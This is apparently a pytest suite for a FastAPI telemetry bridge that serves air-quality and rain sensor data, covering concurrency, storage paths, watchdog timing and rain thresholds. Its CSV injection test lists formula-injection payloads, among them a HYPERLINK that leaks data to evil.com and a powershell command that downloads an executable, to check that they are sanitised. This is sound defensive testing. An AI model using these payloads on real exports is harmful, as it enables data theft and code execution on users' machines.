"""Empirical Adversarial Verification Suite — Milestone M1 Hardware Bridge.

Challenger: teamwork_preview_challenger_2_m1_gen6
Adversarial Verification Targets:
1. High-concurrency endpoint stress testing (/status, /latest, /minute-history, /minute-export.csv).
2. Concurrency race conditions and thread safety during rapid packet ingestion.
3. CSV formula injection sanitization matrix (DDE, cmd, calc, =, +, -, @, \\t, \\r).
4. Storage sovereignty: high-throughput zero C: drive writes enforcement.
5. Watchdog precision and timing boundary conditions (8.0s threshold).
6. Rain ADC boundary and fault matrix.
"""

import io
import csv
import json
import time
import asyncio
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest
import httpx
from httpx import AsyncClient, ASGITransport
from fastapi.testclient import TestClient

from apps.api.main import app


@pytest.fixture
def clean_bridge():
    """Provides a fresh HardwareTelemetryBridge instance with forwarding disabled for isolation."""
    bridge = HardwareTelemetryBridge(enable_forwarding=False)
    return bridge


@pytest.fixture
def client():
    """FastAPI TestClient instance."""
    with TestClient(app) as test_client:
        yield test_client

from apps.api.routers.hardware_router import (
    sanitize_csv_cell,
    generate_meteorological_summary
)
from services.telemetry.hardware_telemetry_bridge import (
    HardwareTelemetryBridge,
    NormalizedReading,
    HardwareStatusResponse,
    classify_rain_moisture,
    evaluate_telemetry_sensor_health,
    normalize_telemetry_packet,
    assert_d_drive,
    get_hardware_bridge,
    OFFLINE_THRESHOLD_SECONDS,
    DEFAULT_DEVICE_UID,
    DEFAULT_STATION_CODE,
    TMP_DIR,
    CACHE_DIR
)


# ============================================================================
# 1. High-Concurrency Stress Testing of Hardware Endpoints
# ============================================================================

@pytest.mark.asyncio
async def test_adversarial_concurrent_hardware_endpoints_hammer():
    """Stress test all hardware router endpoints under 120 concurrent async requests.

    Endpoints hammered simultaneously:
    - /api/v1/hardware/status
    - /api/v1/hardware/latest
    - /api/v1/hardware/minute-history
    - /api/v1/hardware/minute-export.csv
    """
    bridge = get_hardware_bridge()
    bridge.process_incoming_reading({
        "device_uid": DEFAULT_DEVICE_UID,
        "station_code": DEFAULT_STATION_CODE,
        "pm2_5": 28.5,
        "temperature": 32.4,
        "humidity": 63.0,
        "pressure": 1002.8,
        "rain_adc": 3800
    }, stream_source="mqtt_hivemq")

    endpoints = [
        "/api/v1/hardware/status",
        "/api/v1/hardware/latest",
        "/api/v1/hardware/minute-history?limit=15",
        "/api/v1/hardware/minute-export.csv?limit=20"
    ]

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        tasks = []
        for i in range(120):
            ep = endpoints[i % len(endpoints)]
            tasks.append(client.get(ep))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        status_200_count = 0
        for idx, res in enumerate(responses):
            assert not isinstance(res, Exception), f"Request {idx} failed with exception: {res}"
            assert res.status_code == 200, f"Request to {endpoints[idx % 4]} returned status {res.status_code}: {res.text}"
            status_200_count += 1

            ep = endpoints[idx % len(endpoints)]
            if "status" in ep:
                data = res.json()
                assert "watchdog_state" in data
                assert "is_connected" in data
            elif "latest" in ep:
                data = res.json()
                assert "pm2_5" in data
                assert "temperature" in data
            elif "minute-history" in ep:
                data = res.json()
                assert isinstance(data, list)
                assert len(data) > 0
            elif "minute-export.csv" in ep:
                assert "text/csv" in res.headers.get("content-type", "")
                assert len(res.text) > 50

        assert status_200_count == 120


# ============================================================================
# 2. Ingestion Concurrency Race Condition & Cache Integrity Stress Test
# ============================================================================

def test_adversarial_concurrent_bridge_ingestion_race():
    """Hammer a single HardwareTelemetryBridge instance with 200 concurrent ingestion threads.

    Tests:
    - Thread-safety of RLock during rapid simultaneous updates.
    - Windows file-locking resistance during atomic cache writes.
    - Concurrent readers querying get_watchdog_status() while writes occur.
    - Final packet count integrity and JSON validity of cache file.
    """
    bridge = HardwareTelemetryBridge(enable_forwarding=False)
    num_writers = 200
    num_readers = 50
    exceptions = []

    def writer_task(seq: int):
        try:
            packet = {
                "device_uid": "AIRSENSE-NODE-KHI-01",
                "station_code": "BIC-KHI-ROOF-01",
                "sequence_number": seq,
                "pm2_5": 20.0 + (seq % 15),
                "temperature": 30.0 + (seq % 5) * 0.2,
                "humidity": 60.0 + (seq % 10),
                "pressure": 1000.0 + (seq % 8) * 0.5,
                "rain_adc": 3600
            }
            bridge.process_incoming_reading(packet, stream_source="mqtt_hivemq")
        except Exception as e:
            exceptions.append(f"Writer-{seq} error: {e}")

    def reader_task(r_id: int):
        try:
            status = bridge.get_watchdog_status()
            assert status.status in ("ONLINE", "OFFLINE")
            latest = bridge.get_latest()
            if latest:
                assert "pm2_5" in latest
        except Exception as e:
            exceptions.append(f"Reader-{r_id} error: {e}")

    with ThreadPoolExecutor(max_workers=24) as executor:
        futures = []
        for i in range(num_writers):
            futures.append(executor.submit(writer_task, i + 1))
            if i % 4 == 0 and (i // 4) < num_readers:
                futures.append(executor.submit(reader_task, i // 4))

        for f in as_completed(futures):
            f.result()

    assert len(exceptions) == 0, f"Encountered exceptions during concurrent ingestion: {exceptions}"
    assert bridge.packet_count == num_writers

    # Verify cache file validity on D: drive
    assert_d_drive(bridge.cache_file)
    assert bridge.cache_file.exists(), "Cache file must exist on D: drive after ingestion"
    cache_content = bridge.cache_file.read_text(encoding="utf-8")
    parsed_json = json.loads(cache_content)
    assert "device_uid" in parsed_json
    assert "pm2_5" in parsed_json
    assert parsed_json["device_uid"] == "AIRSENSE-NODE-KHI-01"


# ============================================================================
# 3. CSV Formula Injection Sanitization Attack Matrix
# ============================================================================

def test_adversarial_csv_injection_comprehensive_matrix():
    """Adversarially verify sanitization against complete OWASP CSV Formula Injection vectors."""
    dangerous_vectors = [
        "=cmd|' /C calc'!A0",
        "=CMD|'/c calc'!A0",
        "=1+2",
        "=1-2",
        "=1*2",
        "=1/2",
        "=SUM(A1:A10)",
        "=HYPERLINK(\"http://evil.com?leak=\"&A1, \"Click Here\")",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        "@SUM(B1:B10)",
        "@cmd|' /C calc'!A0",
        "\t=cmd|' /C calc'!A0",
        "\r=cmd|' /C calc'!A0",
        "+12345_dangerous_string",
        "-9999_macro_trigger",
        "=cmd|' /C powershell -c (New-Object Net.WebClient).DownloadFile(\"http://evil.com/p\",\"p.exe\")'!A0",
    ]

    for vec in dangerous_vectors:
        sanitized = sanitize_csv_cell(vec)
        assert str(sanitized).startswith("'"), (
            f"CSV INJECTION VULNERABILITY: Vector '{vec}' was NOT prepended with single quote! "
            f"Got: '{sanitized}'"
        )

    # Legitimate numbers and data must NOT be mangled or prepended with quote
    legitimate_samples = [
        (24.5, 24.5),
        (0.0, 0.0),
        (-12.4, -12.4),
        (-0.5, -0.5),
        (1001, 1001),
        (-50, -50),
        (True, True),
        (False, False),
        ("31.9", "31.9"),
        ("-15.2", "-15.2"),
        ("1002.5", "1002.5"),
        ("BIC-KHI-ROOF-01", "BIC-KHI-ROOF-01"),
        ("AIRSENSE-NODE-KHI-01", "AIRSENSE-NODE-KHI-01"),
        (None, "")
    ]

    for raw, expected in legitimate_samples:
        result = sanitize_csv_cell(raw)
        assert result == expected, f"Legitimate value {raw} was incorrectly altered to {result}"


def test_adversarial_csv_export_endpoint_injection_resistance(client):
    """Verifies GET /api/v1/hardware/minute-export.csv neutralizes injected formula vectors."""
    resp = client.get("/api/v1/hardware/minute-export.csv?limit=10")
    assert resp.status_code == 200
    assert "text/csv" in resp.headers.get("content-type", "")
    assert "attachment" in resp.headers.get("content-disposition", "")

    csv_reader = csv.reader(io.StringIO(resp.text))
    rows = list(csv_reader)

    # Check header
    header = rows[0]
    expected_header = [
        "timestamp_utc", "station", "pm1_ug_m3", "pm2_5_ug_m3", "pm10_ug_m3",
        "temperature_c", "humidity_pct", "pressure_hpa", "rain_state",
        "meteorological_summary", "status"
    ]
    assert header == expected_header

    # Check all data rows for formula injection characters without leading quote
    for row_idx, row in enumerate(rows[1:], start=1):
        for col_idx, cell in enumerate(row):
            # If a cell starts with an active formula trigger, it must have been quoted with '
            # (which in CSV text displays as '=... or similar)
            if cell.startswith(("=", "+", "-", "@")) and not cell.startswith("'"):
                # Must be a valid parseable number
                try:
                    float(cell)
                except ValueError:
                    pytest.fail(f"Unsanitized formula cell at row {row_idx}, col {col_idx}: '{cell}'")


# ============================================================================
# 4. Storage Sovereignty: High-Throughput Zero C: Drive Writes Enforcement
# ============================================================================

def test_adversarial_storage_sovereignty_zero_c_writes():
    """Verifies that high-throughput ingestion writes zero bytes to C: drive."""
    # 1. Verify directory configurations are strictly anchored to D: drive
    assert_d_drive(TMP_DIR)
    assert_d_drive(CACHE_DIR)
    assert str(TMP_DIR).lower().startswith("d:")
    assert str(CACHE_DIR).lower().startswith("d:")

    # 2. Verify assert_d_drive rejects C: drive paths immediately
    forbidden_paths = [
        "C:/Users/Source Machinery/AppData/Local/Temp/hack.tmp",
        "C:\\Windows\\Temp\\log.txt",
        "C:/temp/airsense.json",
        "C:/autoexec.bat",
        "E:/unauthorized/drive.dat"
    ]
    for p in forbidden_paths:
        with pytest.raises(PermissionError) as exc_info:
            assert_d_drive(p)
        assert "CRITICAL STORAGE SOVEREIGNTY VIOLATION" in str(exc_info.value)

    # 3. High-throughput ingestion of 300 packets
    bridge = HardwareTelemetryBridge(enable_forwarding=False)
    for i in range(300):
        packet = {
            "device_uid": "AIRSENSE-NODE-KHI-01",
            "station_code": "BIC-KHI-ROOF-01",
            "sequence_number": i + 1,
            "pm2_5": 25.0 + (i % 10),
            "temperature": 31.0 + (i % 4) * 0.1,
            "humidity": 62.0,
            "pressure": 1001.5
        }
        bridge.process_incoming_reading(packet, stream_source="mqtt_hivemq")

    # 4. Assert all output artifacts reside strictly on D: drive
    assert bridge.cache_file.exists()
    assert_d_drive(bridge.cache_file)
    assert bridge.cache_file.stat().st_size > 0


# ============================================================================
# 5. Watchdog Precision & Timing Boundary Conditions (8.0s Threshold)
# ============================================================================

def test_adversarial_watchdog_boundary_conditions(clean_bridge):
    """Stress tests watchdog state transitions at exact 8.0s boundary and clock jitter."""
    packet = {
        "device_uid": "AIRSENSE-NODE-KHI-01",
        "station_code": "BIC-KHI-ROOF-01",
        "pm2_5": 24.0,
        "temperature": 31.5,
        "humidity": 60.0,
        "pressure": 1002.0
    }

    t0 = 5000000.0
    with patch("time.time", return_value=t0):
        clean_bridge.process_incoming_reading(packet, stream_source="mqtt_hivemq")

    # Boundary test: Exactly 8.0s -> Must be ONLINE (<= 8.0s)
    status_at_8_0 = clean_bridge.get_watchdog_status(now=t0 + 8.0)
    assert status_at_8_0.status == "ONLINE"
    assert status_at_8_0.is_connected is True
    assert status_at_8_0.watchdog_state == "ESP32 LIVE CONNECTED"

    # Boundary test: 8.1s (quantized beyond 8.0s threshold) -> Must be OFFLINE (> 8.0s)
    status_at_8_1 = clean_bridge.get_watchdog_status(now=t0 + 8.1)
    assert status_at_8_1.status == "OFFLINE"
    assert status_at_8_1.is_connected is False
    assert status_at_8_1.watchdog_state == "ESP32 OFFLINE"
    assert status_at_8_1.active_stream == "satellite_open_meteo"

    # Backward clock skew / NTP jitter (t < t0): must clamp to 0.0 and remain ONLINE
    status_backward = clean_bridge.get_watchdog_status(now=t0 - 1.5)
    assert status_backward.status == "ONLINE"
    assert status_backward.seconds_since_last_packet == 0.0


# ============================================================================
# 6. Rain Moisture ADC Boundary & Fault Matrix
# ============================================================================

def test_adversarial_rain_adc_boundary_matrix():
    """Exhaustive boundary testing across full 12-bit ADC range (0-4095) and fault inputs."""
    test_cases = [
        # (adc, expected_flag, expected_tier)
        (4095, False, "DRY"),
        (3500, False, "DRY"),
        (3499, False, "MOISTURE"),
        (3100, False, "MOISTURE"),
        (2800, False, "MOISTURE"),
        (2799, True, "MOISTURE"),   # Below 2800 threshold: moisture condensation triggers flag
        (2500, True, "MOISTURE"),
        (2499, True, "LIGHT RAIN"),
        (1500, True, "LIGHT RAIN"),
        (1499, True, "HEAVY RAIN"),
        (500, True, "HEAVY RAIN"),
        (0, True, "HEAVY RAIN"),
    ]

    for adc, exp_flag, exp_tier in test_cases:
        flag, tier = classify_rain_moisture(adc=adc)
        assert flag is exp_flag, f"ADC {adc}: expected flag {exp_flag}, got {flag}"
        assert tier == exp_tier, f"ADC {adc}: expected tier {exp_tier}, got {tier}"

    # Fault inputs
    flag_none, tier_none = classify_rain_moisture(adc=None, raw_flag=None)
    assert flag_none is False
    assert tier_none == "DRY"

    flag_err, tier_err = classify_rain_moisture(adc="invalid_adc_value")
    assert flag_err is False
    assert tier_err == "DRY"
